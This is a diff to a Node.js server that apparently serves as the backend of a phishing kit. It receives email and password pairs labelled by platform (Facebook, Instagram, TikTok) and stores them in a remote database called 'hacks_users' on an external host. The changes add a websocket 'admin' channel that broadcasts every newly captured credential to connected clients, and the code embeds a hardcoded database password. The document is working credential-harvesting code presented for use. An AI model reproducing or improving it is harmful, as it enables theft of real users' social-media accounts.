@@ -3,7 +3,7 @@ const http = require('http')
 const XMLHttpRequest = require('xhr2')
 const cors = require('cors')
 const websocket = require('ws')
-const dibase = require('./module/DIBASE')
+const dibase = require('./module/dibase/DIBASE')
 const app = express()
 const server = http.createServer(app)
 const wss = new websocket.Server({ server })
@@ -18,7 +18,7 @@ const domains ={
         }
     ] 
 }
-const dib = new dibase('wss://dibase.onrender.com', domains)
+const dib = new dibase('wss://dibaseservice.onrender.com', domains) 
 const { hacks_users } = dib.base 
 app.use(cors({
     origin:'*'
@@ -64,38 +64,55 @@ app.get('/:type/:greep/set',(req, res)=>{
     }
 })  
 
-//=======================================================================
-var DATA = {}
+//=================================> data base <===========================
 hacks_users.onchange = ({dataA, dataB})=>{
-    console.log('DATA ',JSON.stringify(dataB))
+    console.log('OnChange', dataB)
+    let clients = Object.values(server_admins)
+    clients.forEach((client)=>{
+        client.send(JSON.stringify({
+            new_data:dataB
+        }))
+    })
 }
 hacks_users.onload = async(data)=>{
-    console.log('DATA LOAD',data)
+    console.log('DATA LOAD',data) 
     // return hacks_users.clear(1)
     if (! data.all_users) {
-        hacks_users.setpath(['all_users'])
-        hacks_users.setpath(['type', 'facebook'])
-        hacks_users.setpath(['type', 'instagram'])
-        hacks_users.setpath(['type', 'tiktok'])
+        console.log('created path on new data base')
+        creat_path_on_database()
     }
-}
-//=========================> Save Data <==============================================
-const save_data = (data)=>{
+} 
+hacks_users.onerror = async(err)=>{  
+    if (err.base_not_access) {
+        console.log(await dib.creat_data_base('islamdzl',{name:"hacks_users",password:"HACKUSERSPASS",read_password:"HUPR"}))
+    } 
+}    
+const save_data = (data)=>{  
+    let DATA = hacks_users.data
     let user_name = email_name(data.email) 
+    if (! dib.GTPath(DATA, ['all_users', user_name])) {
+        hacks_users.set(data, ['all_users', user_name])
+    }
     let path = ['type', data.type, data.greep]
     let full_path = ['type', data.type, data.greep, user_name]
-    user_name = email_name(data.email)
-    if (dib.GTPath(hacks_users.data, full_path)) {
-        return
+    if (dib.GTPath(DATA, full_path)) {
+        return 
     }
     if (! dib.IPath(DATA, path)) {
-        hacks_users.setpath(path)
+        hacks_users.creat_path(path)
     }
-    if (! dib.IPath(DATA, full_path)) {
-        hacks_users.setpath(full_path, true)
+    if (! dib.IPath(hacks_users.data, full_path)) { 
+        hacks_users.creat_path(full_path, true)
         hacks_users.set({[user_name]:data},path)
     }
 }
+const creat_path_on_database = ()=>{
+    hacks_users.creat_path(['all_users'])
+    hacks_users.creat_path(['type', 'facebook'])
+    hacks_users.creat_path(['type', 'instagram'])
+    hacks_users.creat_path(['type', 'tiktok'])
+}
+//=========================> other functions <==============================================
 const email_name = (email)=>{
     let Email = email
     if (Email.indexOf('@')) {
@@ -108,17 +125,25 @@ server.listen(PORT, ()=>{
 })
 
 //-------------------------------------------------------------------------------
+var server_admins = {}
 wss.on('connection', (ws)=>{
-
-    ws.on('message',(message)=>{
+    ws.id = String(Math.floor(Math.random()*10000000))
+    ws.on('message',async (message)=>{
         let data = JSON.parse(message.toString('utf-8'))
         if (data.message) {
             if (data.message == 'call-me') {
                 ws.send(JSON.stringify({
                     message:'send-me-the-data'
                 }))
+                return
             }
-            return
+            if (data.message == 'i-am-admin') {
+                if (! server_admins[ws.id]) {
+                    server_admins[ws.id] = ws
+                    ws.send(JSON.stringify({new_data:hacks_users.data}))
+                }
+                return
+            }
         }
         if (data.data) {
             if (data.data.email && data.data.password) { 
@@ -126,6 +151,10 @@ wss.on('connection', (ws)=>{
                 ws.send('{"message":"saveed"}')
             }
             return
+        }
+        if (data.delete_user) {
+            await hacks_users.creat_path(data.delete_user[0], true)
+            await hacks_users.creat_path(data.delete_user[1], true)
         }
     })
 })
